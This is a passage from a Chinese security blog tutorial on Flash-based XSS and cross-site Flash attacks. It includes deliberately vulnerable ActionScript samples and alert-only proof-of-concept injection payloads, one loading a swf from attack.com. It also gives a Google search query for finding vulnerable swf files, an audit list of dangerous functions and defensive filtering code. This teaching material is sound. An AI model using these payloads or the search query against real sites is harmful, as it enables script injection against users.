+<p>使用IE的开发者工具调试，F12打开IE的开发人员工具-&gt;脚本-&gt;启动调试-&gt;全部中断，再次访问URL即可中断下来：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/6.png" alt=""></p>
+<p>代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123; __flash__toXML(alert(<span class="string">'hacked'</span>)(<span class="string">"Mi1k7ea"</span>)) ; &#125; <span class="keyword">catch</span> (e) &#123; <span class="string">"&lt;undefined/&gt;"</span>; &#125;</span><br></pre></td></tr></table></figure>
+<p>上面这段代码是ExternalInterface.call底层代码。可以看到是对输入参数直接拼接到了相应的JavaScript代码中，而这段代码会先执行alert(‘hacked’)，然后将alert(‘hacked’)(“Mi1k7ea”)的返回值传入__flash__toXML()函数。</p>
+<h4 id="第二个参数可控"><a href="#第二个参数可控" class="headerlink" title="第二个参数可控"></a>第二个参数可控</h4><p>FlashXss.as，这里我们只能控制传入第二个参数值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.external.ExternalInterface;</span><br><span class="line">       </span><br><span class="line">    public class FlashXss extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function FlashXss()</span><br><span class="line">        &#123;</span><br><span class="line">            // 定义字符串变量名jsFunction，值从url的movieName获取</span><br><span class="line">            var param:String = loaderInfo.parameters.movieName;</span><br><span class="line">            ExternalInterface.call(&quot;console.log&quot;, param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输入payload<code>?movieName=\&quot;));alert(&#39;mi1k7ea&#39;);}catch(e){}//</code>：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/4.png" alt=""></p>
+<p>我们在IE的开发者工具中调试分析看看，先输入<code>?movieName=mi1k7ea&quot;</code>，即测试双引号是否被转义：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/7.png" alt=""></p>
+<p>可以看到是对双引号进行了转义。</p>
+<p>因此，当我们输入反斜杠和双引号后，由于反引号会被转义掉，从而使其后面的双引号可以逃逸出来让console.log()的双引号得以闭合，然后再构造后面恶意的JS代码即可。在IE调试下的结构如图：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/8.png" alt=""></p>
+<h3 id="getURL"><a href="#getURL" class="headerlink" title="getURL"></a>getURL</h3><p>在Flash中ActionScript 2可以使用getURL来执行JavaScript。</p>
+<p>getURLTest.fla：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var Fei_xml:XML = new XML(); //创建xml对象</span><br><span class="line">Fei_xml.ignoreWhite = true;  //</span><br><span class="line">Fei_xml.onLoad = function()&#123; getURL(Fei_xml.childNodes[0].childNodes[0].childNodes[0].nodeValue);&#125; //获取值</span><br><span class="line">Fei_xml.load(_root.mi1k7ea);  //加载XML文档</span><br></pre></td></tr></table></figure>
+<p>使用FlashCS6编译成swf。</p>
+<p>在Web目录中编辑a.xml文件，用于触发XSS：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span>&gt;</span>javascript:alert('Flash XSS')<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意：childNodes[0]的个数和目标XML文件中JS代码所在的内嵌标签数量有关，必须设置正确才能成功触发。</p>
+<p>URL参数栏输入目标XML文件即可触发XSS：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/16.png" alt=""></p>
+<p>造成Flash XSS的主要原因就是没对<code>?mi1k7ea=a.xml</code>获取的内容进行过滤导致的。</p>
+<p>这里提供一个查找此类漏洞文件的Google Hack关键字：filetype:swf   inurl:xml</p>
+<h3 id="navigateToURL"><a href="#navigateToURL" class="headerlink" title="navigateToURL"></a>navigateToURL</h3><p>在ActionScript 3中已经不在支持getURL了，但可以用navigateToURL来执行JavaScript。</p>
+<p>navigateToURLTest.as，这里用Flex编译：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">	import flash.display.Sprite;</span><br><span class="line">	import flash.events.Event;</span><br><span class="line">	import flash.net.URLLoader;</span><br><span class="line">	import flash.net.URLRequest;</span><br><span class="line">	import flash.net.navigateToURL;</span><br><span class="line"></span><br><span class="line">	public class navigateToURLTest extends Sprite</span><br><span class="line">	&#123;</span><br><span class="line">		public function navigateToURLTest()</span><br><span class="line">		&#123;</span><br><span class="line">			var url:String = stage.loaderInfo.parameters.url   //获取url参数值</span><br><span class="line">			var req:URLRequest = new URLRequest(&quot;flash.xml&quot;);</span><br><span class="line">			var ld:URLLoader = new URLLoader();</span><br><span class="line">			ld.addEventListener(Event.COMPLETE ,ok);</span><br><span class="line">			function ok(evtObj:Event):void &#123;</span><br><span class="line">				if(ld.data)&#123;</span><br><span class="line">					//navigateToURL(new URLRequest(&quot;javascript:alert(&quot;+url+&quot;)&quot;),&apos;_self&apos;)</span><br><span class="line">					navigateToURL(new URLRequest(url),&apos;_self&apos;) //通过navigateToURL调用执行</span><br><span class="line">				&#125; else &#123;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			ld.load(req)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输入payload<code>?url=javascript:alert(&#39;navigateToURL hacked&#39;)</code>：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/5.png" alt=""></p>
+<h3 id="htmlText"><a href="#htmlText" class="headerlink" title="htmlText"></a>htmlText</h3><p>在Flash里支持HTMLText属性，HTMLText的作用是显示html标签等。</p>
+<p>htmlTextTest.as：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">	import flash.display.Sprite;</span><br><span class="line">	import flash.text.TextField;</span><br><span class="line"></span><br><span class="line">	public class htmlTextTest extends Sprite</span><br><span class="line">	&#123;</span><br><span class="line">		public function htmlTextTest()</span><br><span class="line">		&#123;</span><br><span class="line">			var a:String = root.loaderInfo.parameters.Mi1k7ea //获取提交参数的值</span><br><span class="line">			var info:TextField = new TextField();  //创建控件对象</span><br><span class="line">			info.multiline=true;</span><br><span class="line">			info.wordWrap=true;</span><br><span class="line">			info.htmlText = a; //显示</span><br><span class="line">			addChild(info);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Flash支持htmlText属性，其作用是显示html标签等。这里我们可以使用img或a标签触发xss代码。</p>
+<h4 id="a标签触发Flash-XSS"><a href="#a标签触发Flash-XSS" class="headerlink" title="a标签触发Flash XSS"></a>a标签触发Flash XSS</h4><p>先看用a标签的情况，在href中输入js伪协议实现执行js代码，从而触发Flash XSS。</p>
+<p>输入payload<code>?Mi1k7ea=&lt;a href=&#39;javascript:alert(&quot;htmlText hacked&quot;)&#39;&gt;Click Me!&lt;/a&gt;</code>：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/9.png" alt=""></p>
+<h4 id="img标签触发XSF"><a href="#img标签触发XSF" class="headerlink" title="img标签触发XSF"></a>img标签触发XSF</h4><p>这里我们使用img标签来加载一个远程含有JS跨站代码的swf文件从而实现XSF攻击。</p>
+<p>远程含有XSS代码的swf文件，这里简单写个例子Mi1k7ea.as：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.external.ExternalInterface;</span><br><span class="line">       </span><br><span class="line">    public class Mi1k7ea extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function Mi1k7ea()</span><br><span class="line">        &#123;</span><br><span class="line">            ExternalInterface.call(&apos;alert(&quot;XSF Hacked&quot;)&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译好swf文件后放置在远程服务器中。</p>
+<p>输入payload<code>?Mi1k7ea=&lt;img src=&#39;http://127.0.0.1/Mi1k7ea.swf&#39;&gt;</code>：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/10.png" alt=""></p>
+<h3 id="未初始化变量导致的XSS"><a href="#未初始化变量导致的XSS" class="headerlink" title="未初始化变量导致的XSS"></a>未初始化变量导致的XSS</h3><p>在PHP中Globals全局变量在开启的时候，允许在POST个GET参数中改变php脚本中变量的值，也就是经典的全局变量导致的变量覆盖漏洞。在ActionScript 2中也有类似的特性，任何未被初始化的变量都可以以POST或GET方式来改变变量的值，因此会导致一些安全问题。</p>
+<p>var.fla，这里未初始化user变量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(user)</span><br><span class="line">&#123;</span><br><span class="line">getURL(_root.mi1k7ea);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输入payload<code>?user=1&amp;mi1k7ea=javascript:alert(&#39;var hacked&#39;)</code>：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/17.png" alt=""></p>
+<h3 id="XSF"><a href="#XSF" class="headerlink" title="XSF"></a>XSF</h3><p>跨站Flash攻击，就是使用ActionScript加载第三方的Flash文件时，攻击者能控制这个第三方的Flash文件，这样就有可能造成XSF攻击，以下函数如果使用不当就很容易产生XSF问题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">loadVariables()</span><br><span class="line">loadMovie()</span><br><span class="line">loadMovieNum()</span><br><span class="line">FScrollPane.loadScrollContent()</span><br><span class="line">LoadVars.send()</span><br><span class="line">XML.load(&apos;URL&apos;)</span><br><span class="line">LoadVars.load(&apos;url&apos;)</span><br><span class="line">Sound.loadSound(&apos;url&apos;)</span><br><span class="line">NetStream.play(&apos;url&apos;)</span><br></pre></td></tr></table></figure>
+<p>通过这些恶意接口，可以指定URL为我们构造的恶意文件如swf或xml文件，从而在目标网站实现JS攻击。</p>
+<p>直接看个例子，XSFTest.as：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">	import flash.display.Sprite;</span><br><span class="line">	import flash.display.Loader;</span><br><span class="line">	import flash.net.URLRequest;</span><br><span class="line"></span><br><span class="line">	public class XSFTest extends Sprite</span><br><span class="line">	&#123;</span><br><span class="line">		public function XSFTest()</span><br><span class="line">		&#123;</span><br><span class="line">			var param:Object = root.loaderInfo.parameters;</span><br><span class="line">			var swf:String = param[&quot;swf&quot;];</span><br><span class="line">			var myLoader:Loader = new Loader();</span><br><span class="line">			var url:URLRequest = new URLRequest(swf);</span><br><span class="line">			myLoader.load(url);</span><br><span class="line">			addChild(myLoader);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>XSF.html：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">object</span> <span class="attr">id</span>=<span class="string">"lso"</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-Flash"</span> <span class="attr">data</span>=<span class="string">"http://127.0.0.1/XSFTest.swf"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"http://127.0.0.1/XSFTest.swf"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"Flashvars"</span> <span class="attr">value</span>=<span class="string">"swf=http://attack.com/Mi1k7ea.swf"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>至于Mi1k7ea.swf文件，是前面第一节示例用于XSS弹框的Demo，这里作为攻击者的恶意swf文件。</p>
+<p>先看下直接访问XSFTest.swf文件再传入远程服务器上的swf文件看看能不能执行成功：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/19.png" alt=""></p>
+<p>可以看到，请求了远程服务器上的swf文件但并没有成功执行该swf文件。原因在于远程服务器上的swf文件并没有对Flash的跨域请求进行相应的授权。</p>
+<p>如果访问目标服务器的XSF.html页面，可以看到XSF.html中嵌入的XSFTest.swf文件通过参数传入成功调用了远程服务器上的swf文件，关键在于allowScriptAccess和allowNetworking的设置进行了授权：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/18.png" alt=""></p>
+<h2 id="0x03-漏洞挖掘"><a href="#0x03-漏洞挖掘" class="headerlink" title="0x03 漏洞挖掘"></a>0x03 漏洞挖掘</h2><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>由于Flash XSS是前端问题，swf文件可下载到本地且是可反编译的，因此就可直接进行白盒测试。</p>
+<h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>简单分为以下几步：</p>
+<p>1、将目标swf文件下载到本地，反编译得到源码；</p>
+<p>2、搜索危险函数，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ExternalInterface.call()</span><br><span class="line">getURL()</span><br><span class="line">navigateToURL()</span><br><span class="line">htmlText</span><br><span class="line">loadVariables()</span><br><span class="line">loadMovie()</span><br><span class="line">loadMovieNum()</span><br><span class="line">FScrollPane.loadScrollContent()</span><br><span class="line">LoadVars.send()</span><br><span class="line">LoadVars.load()</span><br><span class="line">XML.load()</span><br><span class="line">Sound.loadSound()</span><br><span class="line">NetStream.play()</span><br></pre></td></tr></table></figure>
+<p>3、若存在危险函数，则进一步查找是否有接受外部输入参数的关键字，即寻找AS2和AS3下的传参关键字，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_root.argv</span><br><span class="line">loaderInfo.parameters</span><br></pre></td></tr></table></figure>
+<p>4、若都存在，则需要进行最后的人工代码审计。</p>
+<h2 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h2><ul>
+<li>如果无嵌入Flash的需求，尽量禁用embed和object标签；</li>
+<li>对Flash文件的输入输出编码过滤；</li>
+<li>在HTML中嵌入Flash时，严格设置allowScriptAccess参数和allowNetworking参数的值，遵循权限最小化原则；</li>
+<li>可参考一些网上写好的过滤函数，如：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public static function checkJsFunctionValid(functionName:String):Boolean</span><br><span class="line">&#123;</span><br><span class="line">	var reg:RegExp = /^[a-zA-Z0-9_\.]+$/;</span><br><span class="line">	return reg.test(functionName);</span><br><span class="line">&#125;          </span><br><span class="line"></span><br><span class="line">public static function checkObjectIdValid():Boolean</span><br><span class="line">&#123;</span><br><span class="line">    if (ExternalInterface.available)</span><br><span class="line">    &#123;</span><br><span class="line">        var objectId:String = ExternalInterface.objectID;</span><br><span class="line">        if (!objectId || (objectId == objectId.replace(/[^0-9a-zA-Z_]/g , &quot;&quot;)))</span><br><span class="line">        	return true;</span><br><span class="line">        else</span><br><span class="line">        	return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://joychou.org/web/flash-xss.html#directory061280281423452145" target="_blank" rel="noopener">Flash XSS Security</a></p>
+<p><a href="https://aq.163.com/module/pedia/article-00035.html" target="_blank" rel="noopener">浅谈flash引发的跨站问题</a></p>
+<p><a href="https://www.secpulse.com/archives/44299.html" target="_blank" rel="noopener">Flash XSS攻击总结</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1089548" target="_blank" rel="noopener">常见Flash XSS攻击方式</a></p>
+<p><a href="https://www.cnblogs.com/kenkofox/p/3405395.html" target="_blank" rel="noopener">Flash XSS 漏洞详解 根治的好办法</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Mi1k7ea</a></p>
+        <p><span>发布时间:</span>2019-07-21, 23:04:06</p>
+        <p><span>最后更新:</span>2019-07-28, 14:54:57</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/07/21/Flash型XSS小结/" title="Flash型XSS总结">https://Mi1k7ea.github.com/2019/07/21/Flash型XSS小结/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://Mi1k7ea.github.com/2019/07/21/Flash型XSS小结/　　作者: Mi1k7ea" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/07/28/Flash型CSRF总结/">
+                    Flash型CSRF总结
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">
+                    浅谈几种Bypass open_basedir的方法
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基础知识"><span class="toc-number">1.</span> <span class="toc-text">0x01 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flash与ActionScript"><span class="toc-number">1.1.</span> <span class="toc-text">Flash与ActionScript</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swf文件的编译与反编译"><span class="toc-number">1.2.</span> <span class="toc-text">swf文件的编译与反编译</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#编译"><span class="toc-number">1.2.1.</span> <span class="toc-text">编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#反编译"><span class="toc-number">1.2.2.</span> <span class="toc-text">反编译</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flash调用与跨域请求"><span class="toc-number">1.3.</span> <span class="toc-text">Flash调用与跨域请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flash与相关的HTTP头字段"><span class="toc-number">1.4.</span> <span class="toc-text">Flash与相关的HTTP头字段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Referer"><span class="toc-number">1.4.1.</span> <span class="toc-text">Referer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x-flash-version"><span class="toc-number">1.4.2.</span> <span class="toc-text">x-flash-version</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flash安全沙箱"><span class="toc-number">1.5.</span> <span class="toc-text">Flash安全沙箱</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#swf文件之间跨域访问的授权"><span class="toc-number">1.5.1.</span> <span class="toc-text">swf文件之间跨域访问的授权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML跨域加载Flash时的授权"><span class="toc-number">1.5.2.</span> <span class="toc-text">HTML跨域加载Flash时的授权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML中嵌入Flash"><span class="toc-number">1.6.</span> <span class="toc-text">HTML中嵌入Flash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flash的参数传递"><span class="toc-number">1.7.</span> <span class="toc-text">Flash的参数传递</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Flash-XSS"><span class="toc-number">2.</span> <span class="toc-text">0x02 Flash XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ExternalInterface-call"><span class="toc-number">2.1.</span> <span class="toc-text">ExternalInterface.call</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一个参数可控"><span class="toc-number">2.1.1.</span> <span class="toc-text">第一个参数可控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二个参数可控"><span class="toc-number">2.1.2.</span> <span class="toc-text">第二个参数可控</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getURL"><span class="toc-number">2.2.</span> <span class="toc-text">getURL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#navigateToURL"><span class="toc-number">2.3.</span> <span class="toc-text">navigateToURL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htmlText"><span class="toc-number">2.4.</span> <span class="toc-text">htmlText</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#a标签触发Flash-XSS"><span class="toc-number">2.4.1.</span> <span class="toc-text">a标签触发Flash XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#img标签触发XSF"><span class="toc-number">2.4.2.</span> <span class="toc-text">img标签触发XSF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#未初始化变量导致的XSS"><span class="toc-number">2.5.</span> <span class="toc-text">未初始化变量导致的XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSF"><span class="toc-number">2.6.</span> <span class="toc-text">XSF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞挖掘"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#黑盒测试"><span class="toc-number">3.1.</span> <span class="toc-text">黑盒测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#白盒测试"><span class="toc-number">3.2.</span> <span class="toc-text">白盒测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-防御方法"><span class="toc-number">4.</span> <span class="toc-text">0x04 防御方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考"><span class="toc-number">5.</span> <span class="toc-text">0x05 参考</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-5 i,
+        .toc-level-5 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Flash型XSS总结　| Mi1k7ea　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/07/28/Flash型CSRF总结/" title="上一篇: Flash型CSRF总结">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/" title="下一篇: 浅谈几种Bypass open_basedir的方法">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
